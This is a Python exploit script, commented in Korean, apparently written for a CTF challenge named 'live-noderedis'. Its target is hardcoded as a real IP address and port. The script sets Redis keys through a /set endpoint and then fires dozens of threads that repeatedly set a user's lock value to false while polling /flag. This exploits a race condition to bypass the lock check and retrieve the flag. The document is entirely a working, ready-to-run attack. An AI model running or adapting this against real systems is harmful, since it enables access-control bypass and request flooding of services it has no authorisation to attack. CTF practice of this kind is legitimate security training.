#!/usr/bin/env python3
"""
Race Condition Exploit for live-noderedis CTF Challenge

취약점: /flag 엔드포인트에서 username_locked 설정과 검증 사이의 race condition
"""

import requests
import threading
import time
import base64
from concurrent.futures import ThreadPoolExecutor

# 타겟 URL 설정 (실제 환경에 맞게 수정)
BASE_URL = "http://52.79.219.221:23001"

def setup_values(username):
    """필요한 값들을 Redis에 설정"""
    # apple 값 설정
    response = requests.get(f"{BASE_URL}/set", params={
        "key": f"{username}_apple",
        "value": "apple"
    })
    print(f"Set apple: {response.text}")
    
    # banana 값 설정 (base64 인코딩된 "banana")
    banana_encoded = base64.b64encode(b"banana").decode()
    response = requests.get(f"{BASE_URL}/set", params={
        "key": f"{username}_banana", 
        "value": banana_encoded
    })
    print(f"Set banana: {response.text}")

def get_flag(username):
    """플래그 요청"""
    response = requests.get(f"{BASE_URL}/flag", params={"username": username})
    return response.text

def unlock_user(username, delay=0):
    """locked 값을 false로 설정 (race condition 익스플로잇)"""
    if delay > 0:
        time.sleep(delay)
    response = requests.get(f"{BASE_URL}/set", params={
        "key": f"{username}_locked",
        "value": "false"
    })
    return response.text

def continuous_unlock(username, duration=2):
    """지속적으로 unlock 요청을 보내는 함수"""
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            requests.get(f"{BASE_URL}/set", params={
                "key": f"{username}_locked",
                "value": "false"
            }, timeout=1)
        except:
            pass
        time.sleep(0.001)  # 1ms 간격

def race_condition_attack(username, num_threads=50, num_attempts=100):
    """Race condition 공격 실행"""
    print(f"Starting race condition attack for user: {username}")
    print(f"Threads: {num_threads}, Attempts: {num_attempts}")
    
    success_results = []
    
    for attempt in range(num_attempts):
        print(f"\nAttempt {attempt + 1}/{num_attempts}")
        
        # 방법 1: 다양한 지연시간으로 unlock 요청들을 백그라운드에서 실행
        unlock_threads = []
        for i in range(20):
            delay = i * 0.01  # 0ms, 10ms, 20ms, ... 190ms 지연
            thread = threading.Thread(target=unlock_user, args=(username, delay))
            thread.daemon = True
            thread.start()
            unlock_threads.append(thread)
        
        # 방법 2: 지속적인 unlock 요청을 백그라운드에서 실행
        continuous_thread = threading.Thread(target=continuous_unlock, args=(username, 3))
        continuous_thread.daemon = True
        continuous_thread.start()
        
        # 짧은 지연 후 플래그 요청
        time.sleep(0.05)  # 50ms 후에 플래그 요청
        
        try:
            flag_result = get_flag(username)
            print(f"Flag result: {flag_result}")
            
            if "poka{" in flag_result:
                print(f"🎉 SUCCESS! Flag found: {flag_result}")
                success_results.append(flag_result)
                return flag_result
        except Exception as e:
            print(f"Error: {e}")
            
        # 백그라운드 스레드들이 완료될 때까지 잠시 대기
        time.sleep(0.2)
    
    if success_results:
        return success_results[0]
    else:
        print("❌ Attack failed after all attempts")
        return None

def aggressive_race_attack(username):
    """더 공격적인 race condition 공격"""
    print(f"Starting aggressive race condition attack for user: {username}")
    
    # 매우 많은 수의 unlock 요청을 지속적으로 보내는 스레드들
    def spam_unlock():
        for _ in range(1000):
            try:
                requests.get(f"{BASE_URL}/set", params={
                    "key": f"{username}_locked",
                    "value": "false"
                }, timeout=0.5)
            except:
                pass
    
    # 여러 스레드에서 spam unlock 실행
    spam_threads = []
    for _ in range(10):
        thread = threading.Thread(target=spam_unlock)
        thread.daemon = True
        thread.start()
        spam_threads.append(thread)
    
    # 다양한 타이밍에서 플래그 요청
    for i in range(200):
        try:
            result = get_flag(username)
            print(f"Attempt {i+1}: {result}")
            
            if "poka{" in result:
                print(f"🎉 AGGRESSIVE SUCCESS! Flag found: {result}")
                return result
                
            time.sleep(0.01)  # 10ms 간격
        except Exception as e:
            print(f"Error: {e}")
    
    return None

def main():
    # 고유한 사용자명 생성
    username = f"test_user_{int(time.time())}"
    print(f"Using username: {username}")
    
    # 1단계: 필요한 값들 설정
    print("\n=== Step 1: Setting up required values ===")
    setup_values(username)
    
    # 2단계: 일반적인 Race condition 공격 실행
    print("\n=== Step 2: Executing race condition attack ===")
    result = race_condition_attack(username)
    
    if result and "poka{" in result:
        print(f"\n🏆 FINAL RESULT: {result}")
        return
    
    # 3단계: 공격적인 방법 시도
    print("\n=== Step 3: Trying aggressive approach ===")
    result = aggressive_race_attack(username)
    
    if result and "poka{" in result:
        print(f"\n🏆 FINAL RESULT: {result}")
    else:
        print("\n💀 All attacks failed. The server might be patched or timing is very strict.")

if __name__ == "__main__":
    main()